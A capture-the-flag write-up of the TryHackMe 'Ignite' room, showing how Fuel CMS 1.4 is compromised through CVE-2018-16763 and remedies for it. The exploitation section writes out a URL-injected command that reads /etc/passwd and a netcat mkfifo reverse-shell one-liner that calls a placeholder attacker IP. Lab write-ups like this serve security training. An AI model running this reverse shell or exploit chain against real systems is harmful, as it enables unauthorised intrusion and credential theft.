* Challenge Name: Ignite
* Platform: TryHackMe
* Type: Web
* Difficulty: Easy

# Reconnaissance

1. I took a look at the target website by entering the target IP in our browser.
I saw some directory paths. It showed the service and version used (Fuel CMS 1.4). It also gave us credential admin:admin.
<img width="1338" height="616" alt="Ignite1" src="https://github.com/user-attachments/assets/b50d05d1-6070-466d-bbe0-a62140b921c7" />

<img width="1166" height="605" alt="Ignite2" src="https://github.com/user-attachments/assets/6ba7a916-9b55-4dd5-8415-26cff22e185b" />


2. I wanted to see the open ports. Running "nmap -sV <TARGET_IP>" showed that port 80 is open on which Apache httpd 2.4.18 is running.
<img width="670" height="180" alt="Ignite3" src="https://github.com/user-attachments/assets/46aad0e5-17cd-48d4-bf74-926132c94ff7" />


3. Then I used Feroxbuster in order to find hidden directories. It was returning a directory /fuel/login.
<img width="1135" height="582" alt="Ignite4" src="https://github.com/user-attachments/assets/d33a6df1-0497-4fbb-a308-452f6533e382" />


5. I wanted to find vulnerabilities on the target. To speed up this process, I used "Nuclei" tool.
It scanned and gave a critical vulnerability of CVE-2018-16763 along with a URL with which the vulnerability could be exploited.
We also cross checked on our search engine whether our target was vulnerable to CVE-2018-16763 or not and we found that it really was because of Fuel CMS.
<img width="1488" height="574" alt="Ignite5" src="https://github.com/user-attachments/assets/0ee31e7d-778b-4b0f-a6a7-6a1f7a12ce1d" />


# Exploitation

1. I Navigated to the path found during enumeration. I could see a login page where I used the credential I got initially. A dashboard page could be seen after logging in.
<img width="1530" height="665" alt="Ignite6" src="https://github.com/user-attachments/assets/71513ad5-a1d2-4677-98b0-d88759407a09" />


2. I navigated to the vulnerable path of CVE-2018-16763 (/fuel/pages/select).
I used the payload provided by Nuclei in which there was a part where Linux command had been used along with URL encoding (cat%20/etc/passwd).
This could mean that the vulnerability was "Remote Code Execution", but the output was not shown on the screen.
<img width="1533" height="608" alt="Ignite7" src="https://github.com/user-attachments/assets/83b6fe17-083e-4a62-ba55-1ef62d603e42" />


3. If I could inject commands in the URL, establishing reverse shell was also possible because of RCE.
Firstly, I used netcat to listen on port 1234. Then I used an online available netcat payload for reverse shell (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 1234 >/tmp/f).
Then I used CyberChef to URL encode it. After injecting it, I got a shell.
<img width="1533" height="557" alt="Ignite9" src="https://github.com/user-attachments/assets/516bdc0d-76f7-4762-a5c1-a5d51949d35f" />


4. I got the shell, but it was Pseudo Terminal.
In order to make it TTY I ran the command:- script -qc /bin/bash /dev/null.
Then I backgrounded the session using "ctrl+z".
Then I ran the command:- stty raw -echo; fg. "raw" prevents Local processing i.e. Preventing the termination of session by ctrl+c, ctr+z.
"-echo" disables local echoing, thereby preventing duplicated or scrambled characters.
"fg" will take you back to the background session.
Then I entered:- export TERM=xterm-256color. This prevents text editors from throwing errors.
With this, I successfully got a Fully functional terminal.
<img width="1535" height="439" alt="Ignite10" src="https://github.com/user-attachments/assets/c93b5ec2-0867-4f0e-b29f-ed55d21946d5" />


5. I needed answers for User.txt and Root.txt. I knew that a user's files are generally in the /home directory.
So, I navigated to /home. By navigating in further directory, i finally got the file "flag.txt" which gave answer for User.txt
<img width="302" height="94" alt="Ignite11" src="https://github.com/user-attachments/assets/6a3f1a5a-20d0-4e36-8eea-c2ef3b225538" />


6. Now I needed root access. In the initial reconnaissance, we had found certain file paths. In the database part, it was asked to change the database configuration found in /fuel/application/config/database.php to include certain information like hostname, username, password; Therefore I had a look on that file
and, BOOM! The password for root was stored in the database.php file. Due to this, I gained root access. I navigated to the /root directory and found Root.txt.
<img width="762" height="186" alt="Ignite12" src="https://github.com/user-attachments/assets/c02bd857-5348-4fba-92b3-efed08cd1572" />

<img width="511" height="278" alt="Ignite13" src="https://github.com/user-attachments/assets/fa614b4c-bcc8-418e-86df-8cf9266e293b" />

<img width="686" height="393" alt="Ignite14" src="https://github.com/user-attachments/assets/ad38162a-d8ab-4c00-b691-07bb16ae42c6" />

<img width="442" height="114" alt="Ignite15" src="https://github.com/user-attachments/assets/b54322cc-0fc5-4b3d-bba0-84c60a1bb67f" />

# What did I learn:-

* Examining a Website thoroughly before performing tests. This benefitted me by revealing the service used by target
* Encoding the payloads can make URL based RCE possible.
* We need to have Fully Functional Terminal to do certain things which a Pseudo Terminal can't(ex. logging in as a root)

# Remedies:-

* Websites should always use up-to-date version of services.
*  User input shouldn't be run without proper sanitization in order to prevent attacks like Remote Code Execution.
* Passwords shouldn't be stored in files which are accessible to everyone.
